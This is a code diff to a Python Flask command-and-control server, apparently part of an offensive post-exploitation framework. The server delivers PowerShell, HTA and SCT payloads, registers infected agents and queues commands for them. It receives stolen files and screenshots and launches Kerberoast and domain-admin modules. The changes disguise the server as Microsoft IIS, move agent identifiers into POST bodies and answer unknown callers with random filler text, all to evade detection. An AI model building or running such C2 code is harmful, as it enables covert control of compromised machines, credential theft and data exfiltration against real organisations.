@@ -4,7 +4,9 @@ from core import config
 from core import DA
 from core import Kerberoast
 from core.color import bcolors
+from random import *
 import time
+from datetime import datetime
 from core.Encryption import *
 from core.config import AESKey
 from core.config import *
@@ -13,13 +15,21 @@ import sys
 import threading
 
 from flask import *
-app = Flask(__name__)
-app.logger.disabled = True
+
+SERVER_NAME = 'Microsoft-IIS/6.0'
+class localFlask(Flask):
+    def process_response(self, response):
+    #Every response will be processed here first
+        response.headers['server'] = SERVER_NAME
+        return(response)
+
+app = localFlask(__name__)
+#app.logger.disabled = True
 
 import logging
 log = logging.getLogger('werkzeug')
-log.disabled = True
-#log.setLevel(logging.ERROR)
+#log.disabled = True
+log.setLevel(logging.ERROR)
 
 COUNT=0
 #reload(sys)
@@ -28,8 +38,8 @@ COUNT=0
 
 
 
-#urls = ('/', 'index', '{raw}', 'payload', '{b52payload}', 'payloadc','{b64stager}', 'stager','/profile', 'stager52', '{hjf}', 'payloadjf','/images', 'base64', '{hjfs}', 'payloadjfs', '{sct}', 'sct', '{hta}', 'mshta', '/info/(.*)', 'info', '/dl/(.*)', 'download', '/up/(.*)', 'upload', '/img/(.*)', 'image', '/cm/(.*)', 'command', '/re/(.*)', 'result', '/md/(.*)', 'modules')
 urls = ('/', 'index', raw_payload, 'payload', b52_payload, 'payloadc',b64_stager, 'stager',b52_stager, 'stager52', hjf_payload, 'payloadjf',b64_payload, 'base64', hjfs_payload, 'payloadjfs', sct_payload, 'sct', hta_payload, 'mshta', register_url+'/(.*)', 'info', download_url+'/(.*)', 'download', upload_url+'/(.*)', 'upload', image_url+'/(.*)', 'image', command_url+'/(.*)', 'command', result_url+'/(.*)', 'result', modules_url+'/(.*)', 'modules')
+
 
 @app.route("/", methods=["GET"])
 #def index(request):
@@ -120,7 +130,7 @@ def payloadjf():
 
 
 @app.route(hjfs_payload, methods=["GET"])
-def payloadjfs(request):
+def payloadjfs():
     print "in"
     ip = request.remote_addr
     p_out = '[+] Powershell JOB + File +SCT PAYLOAD Send (%s)' % ip
@@ -139,7 +149,8 @@ def payloadjfs(request):
 def info():
     global COUNT
     data = request.form['data']
-    id= request.args.get('page')
+    id= request.form['resource']
+    #request.args.get('page')
     if AGENTS.get(id) == None and data != None:
         data = data.split('**')
         ip = request.remote_addr
@@ -159,23 +170,26 @@ def info():
     return AESKey
 
 
-@app.route(upload_url, methods=["GET"])
+@app.route(upload_url, methods=["POST"])
 def upload():
     try:
         #name = name.decode('base64').replace('\n', '')
-        name=request.args.get('page')
-        name=decrypt(AESKey,name)
-        if len(name.split("\\"))>0:
-            name=name.replace("\"","").split("\\")[-1]
-        print name
-        fp = open('file/' + name.replace('\00', ''), 'rb')
-        file = fp.read()
-            #file = file.encode('base64').replace('\n', '')
-        file=encrypt(AESKey,file)
-            #print file
-        p_out = '[+] uploaded file %s' % name
-        print bcolors.OKGREEN + p_out + bcolors.ENDC
-        return file
+        #name=request.args.get('page')
+        name=request.form['file']
+        id=request.form['resource']
+        if AGENTS.get(id) != None and name != None:
+            name=decrypt(AESKey,name)
+            if len(name.split("\\"))>0:
+                name=name.replace("\"","").split("\\")[-1]
+            fp = open('file/' + name.replace('\00', ''), 'rb')
+            file = fp.read()
+                #file = file.encode('base64').replace('\n', '')
+            file=encrypt(AESKey,file)
+                #print file
+            p_out = '[+] uploaded file %s' % name
+            print bcolors.OKGREEN + p_out + bcolors.ENDC
+            return file
+        return "Error"
     except Exception as e:
         print '[-] Download: ' + str(e)
         return ''
@@ -244,7 +258,7 @@ def sct(request):
 @app.route(download_url, methods=["POST"])
 def download():
     data = request.form['d']
-    id= request.args.get('page')
+    id= request.form['d']
     if AGENTS.get(id) != None and data != None:
         filename=request.form['f']
         filecontent=request.form['d']
@@ -259,7 +273,7 @@ def download():
 
 @app.route(image_url, methods=["POST"])
 def image():
-    id= request.args.get('page')
+    id= request.form['resource']
     data = request.form['data']
     fn=id+''.join(random.choice(string.ascii_lowercase) for i in range(5))
     if AGENTS.get(id) != None and data != None:
@@ -272,9 +286,10 @@ def image():
     return 'OK'
 
 
-@app.route(command_url, methods=["GET"])
+@app.route(command_url, methods=["POST"])
 def command():
-    id= request.args.get('page')
+    #id= request.args.get('page')
+    id=request.form['resource']
     if AGENTS.get(id) != None:
         TIME[id] = time.time()
     if AGENTS.get(id) != None and len(COMMAND.get(id)) > 0:
@@ -289,12 +304,16 @@ def command():
         print bcolors.OKGREEN + '[~] ' + id + ':Register' + bcolors.ENDC
         return 'REGISTER'
     else:
-        return '-'
+        seed(datetime.now())
+        rand1=randint(100,200)
+        rand2=randint(80,150)
+        return "".join([random.choice(string.ascii_uppercase) for i in range(rand1)])+"-*-*-*"+"".join([random.choice(string.ascii_uppercase) for i in range(rand2)])
 
 
 @app.route(result_url, methods=["POST","GET"])
 def result():
-    id= request.args.get('page')
+    #id= request.args.get('page')
+    id=request.form['resource']
     data = request.form['data']
     #print id,data
     if AGENTS.get(id) != None and data != None:
@@ -313,7 +332,7 @@ def result():
             da.close()
             server = threading.Thread(target=DA.main, args=(fname,))
             server.start()
-            return
+            return "OK"
         if data.find("Kerberoast-Module")>-1:
             print data.find("Kerberoast-Module")
             fname="kerberoast/"+AGENTS[id][7]+"@"+AGENTS[id][6]+"_kerb_out.txt"
@@ -322,7 +341,7 @@ def result():
             k.close()
             server = threading.Thread(target=Kerberoast.kerb, args=(fname,AGENTS[id][7],AGENTS[id][6],))
             server.start()
-            return
+            return "OK"
         print bcolors.OKGREEN + p_out + bcolors.ENDC
         print data
     else:
@@ -333,7 +352,9 @@ def result():
 @app.route(modules_url, methods=["POST"])
 def modules():
     id= request.args.get('page')
+    #id=request.form['resource']
     data = request.form['data']
+
     if AGENTS.get(id) != None and data != None:
         data=decrypt(AESKey,data).replace('\00', '')
         p_out = '[+] New Agent Request Module %s (%s - %s)' % (data, AGENTS[id][0], AGENTS[id][7])
